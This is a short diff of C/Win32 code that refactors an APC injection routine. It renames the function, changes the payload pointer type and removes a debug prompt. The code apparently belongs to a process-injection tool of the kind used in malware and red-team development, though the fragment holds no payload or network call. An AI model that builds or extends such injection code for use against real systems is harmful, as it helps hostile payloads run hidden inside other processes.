@@ -53,7 +53,7 @@ static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSi
     return TRUE;
 }
 
-BOOL InjectPayloadViaAPC(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSize) {
+BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
     DWORD dwThreadId = NULL;
 
     hThread = CreateThread(NULL, 0, &AlertableFunction, NULL, 0, &dwThreadId);
@@ -73,7 +73,6 @@ BOOL InjectPayloadViaAPC(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SIZE_T
     CloseHandle(hThread);
 
     DebugPrint("[+] APC Injection Successful \n");
-    DebugPrint("[#] Press <Enter> To Exit ... ");
 
     return TRUE;
 }
